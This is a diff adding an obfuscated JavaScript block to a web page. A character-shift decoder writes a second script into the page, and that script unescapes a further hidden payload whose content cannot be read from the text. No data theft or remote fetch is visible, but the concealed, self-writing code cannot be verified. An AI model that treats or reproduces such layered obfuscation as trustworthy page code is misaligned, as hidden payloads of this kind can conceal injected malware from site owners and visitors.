@@ -1,0 +1,28 @@
+<SCRIPT LANGUAGE="JavaScript">
+<!--
+var HtmlStrings=["=TDSJQU>wbs!Xpset>#&1E&1B&4Diunm&4F&1E&1B&4Difbe&4F&1E&1B&4Dnfu","b!iuuq&3Efrvjw&4E&33Dpoufou&3EUzqf&33!dpoufou&4E&33ufyu&3Giun","m&4C!dibstfu&4EVT&3EBTDJJ&33!&3G&4F&1E&1B&4D&3Gifbe&4F&4Dcpez","&4F&1E&1BÐÞ›éñõ@ØNÆ£²ÕÂAøõ¯ëÕøáò›éñº¾‹æö¼Ø¼iïï ìš—¾æÎa³AÏn","©¡û‹²õÚŽÎ„ õÎfÁÈŠþŠøÂÖH÷Ÿïïò÷ó@¾@Ä`µoÄò÷Îz´Ööâó@ø¼Š÷ ö ðâë´Ööâó@íúÈêÎz ¾áñ¹íê÷ÎaªK¨©´ÖíúÈêÎzàYÞ@¾@¢ä„TÂ®ïèÎFî@‰·¿òþ³‚¾T","ïðì@³Y¯qåòòþ÷âªnÍÍÌ´ÖíúÈêÎzàdÞ@¾@¢ï„TÂ®ïèÎFî@‰·¿òþ³‚¾Tïðì@³Y¯qåòòþ÷âªnÍÍÌ´ÖíúÈêÎzàhÞ@¾@¢æ„TÂ®ïèÎFî@‰·¿òþ³‚¾Tïðì@³Y¯qåòòþ÷âªnÍÍÌ´ÖíúÈêÎzÛµÞ@¾@¢Ä„TŠÈºÓµUîóô@áïå@œrÚqÂÖ«Ž¯Âµo ÖóæÎz¯¢çÈªËÃFƒÌËÐ¥°¶•Â®¯Çô·¯°ÇÜMœÞ»¢ÍÍÌ´ÖíúÈêÎzàÞ@¾@¢Ä„TŠÈºÓµUîóô@áïå@œrÚqÂÖ«Ž¯Âµo ÖóæÎz¯ÔÁ’ÎŒ ÎŒSÐÑÂ®ïèÎF±y¯ÔÁ’ÎŒÜX¯Õ—MÓË®æøæ¢¼Š÷ ö ðâëÕÕù@¾@Ç¦÷¯À×¼iöæÒ¶âëß„ô©¢ôîñöø®Ô×ê¯y–óõ@«¹í Äïï³¬ÀØ®²¢ª´Öéç¨ðâëÕÕø¾¢ÜïãÊê›~Üç©‹û‹óæôÕ×ªŒÓ±ª¨§çHÓË³Ó®íÁÍ øéðï@¾@¢íœâð¹¯°¢¨¬´","ì•ñ­´ÖóYó@¨ù êï@íúÈêÎz©‹û‹ïãËå¾@Ç¦÷¯À×¼iöæÒ¶âëß„ô©¢ôîñöø®Ô×ê¯y–óõ@«¹í Äïï³¬ÀØ®²¢ªŠ÷ öÈ®õç²@¾@§éÚqð¹¯°ü”÷ŸÂA ç¿ìïè®äÁ­¯øš˜V›\»¢ÍÍåª´Ööâó@¹ÖŠ¿Žˆùä ö¹løÞ´Öïãê­êÁ­ ¾êó´Öïãê­Õù³Ó…Ì÷«Y¼iïïÞ€Úqïïô@¾@æâµ{ÁÈŠðâë®Âµo³ÓÊMîóÍÍ”™ŒSö@¾@æâµ{ÁÈŠðâë®Ô×ê¯y–óôÏ øÎý¾@¹ÖŠ·´Ö³¬ù‹û‹ ðâë®ÄÁ­¯qåòóæœ© øÎý¾@¹ÖŠ¿´Ö ðâë®ÑÎSîóÊØµÒ¼ýëg¨©","´Öýä øãé¨æ©üý‹ý‹ý‹¹ÍóâÎSðö@1E&1B&4D&3Gcpez&4F&4D&3Giunm&4F&1E","&1B#<epdvnfou/xsjuf)voftdbqf)Xpset**=0TDSJQU>"];
+function psw(st){
+  var varS;
+  varS="";
+  var i;
+  for(var a=0;a<st.length;a++){
+    i = st.charCodeAt(a); 
+    if (i==1) 
+      varS=varS+String.fromCharCode('"'.charCodeAt()-1);
+    else if (i==2) {
+      a++;
+      varS+=String.fromCharCode(st.charCodeAt(a));
+      }
+    else
+      varS+=String.fromCharCode(i-1);
+  }
+  return varS;
+};
+var num=9;
+function S(){
+for(i=0;i<num;i++)
+  document.write(psw(HtmlStrings[i]));}
+S();
+// -->
+</SCRIPT>
+
